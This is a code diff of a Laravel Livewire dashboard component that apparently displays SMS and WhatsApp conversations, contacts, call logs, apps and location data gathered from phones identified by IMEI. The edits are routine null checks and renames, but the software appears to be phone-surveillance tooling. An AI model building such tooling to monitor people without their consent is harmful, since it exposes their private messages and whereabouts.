@@ -26,7 +26,7 @@ class Home extends Component
     public $appsList = [];
     public $contactList = [];
     public $callLogList = [];
-    public $deviceList = [];
+    public $phoneList = [];
     public $locationList = [];
 
     public $whatsappList = [];
@@ -37,9 +37,10 @@ class Home extends Component
         $this->resetChoice();
         $this->menu = '7';
         $this->whatsappList = SocialApp::latest('date')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp'])->get()->unique('contact');
-        $this->selectedWhatsappConversation = $this->whatsappList->toArray()[0]["contact"];
-        $this->whatsappConversationList = SocialApp::where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $this->selectedWhatsappConversation])->get();
-
+        if($this->whatsappList->count()){
+            $this->selectedWhatsappConversation = $this->whatsappList->toArray()[0]["contact"];
+            $this->whatsappConversationList = SocialApp::where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $this->selectedWhatsappConversation])->get();
+        }
     }
     public function showWhatsappConversation($contact) {
         $this->selectedWhatsappConversation = $contact;
@@ -49,8 +50,10 @@ class Home extends Component
         $this->resetChoice();
         $this->menu = '1';
         $this->smsList = Sms::latest('date')->where('imei',$this->phoneImei)->get()->unique('contact');
-        $this->selectedSmsConversation = $this->smsList->toArray()[0]["contact"];
-        $this->smsConversationList = Sms::where(['imei'=>$this->phoneImei,'contact'=>$this->selectedSmsConversation])->get();
+        if($this->smsList->count() != 0) {
+            $this->selectedSmsConversation = $this->smsList->toArray()[0]["contact"];
+            $this->smsConversationList = Sms::where(['imei'=>$this->phoneImei,'contact'=>$this->selectedSmsConversation])->get();
+        }
     }
     public function showSmsConversation($contact) {
         $this->selectedSmsConversation = $contact;
@@ -85,12 +88,16 @@ class Home extends Component
         $this->locationList = Location::where('imei',$this->phoneImei)->pluck('latitude','longitude');
         // dd($this->locationList);
     }
+    public function showPhone() {
+        $this->resetChoice();
+        $this->menu = '5';
+    }
 
 
     private function resetChoice() {
 
         //reset data entry
-        $this->reset(['smsConversationList','whatsappConversationList','smsList','appsList','contactList','callLogList','deviceList','locationList','whatsappList']);
+        $this->reset(['smsConversationList','whatsappConversationList','smsList','appsList','contactList','callLogList','phoneList','locationList','whatsappList']);
     }
 
     public function render()
@@ -100,9 +107,7 @@ class Home extends Component
         foreach($tokens as $token){
             array_push($tmphones,$token->phone);
         }
- 
-        return view('livewire.client.home',[
-            'phones' => $tmphones,
-        ]);
+        $this->phoneList = $tmphones;
+        return view('livewire.client.home');
     }
 }
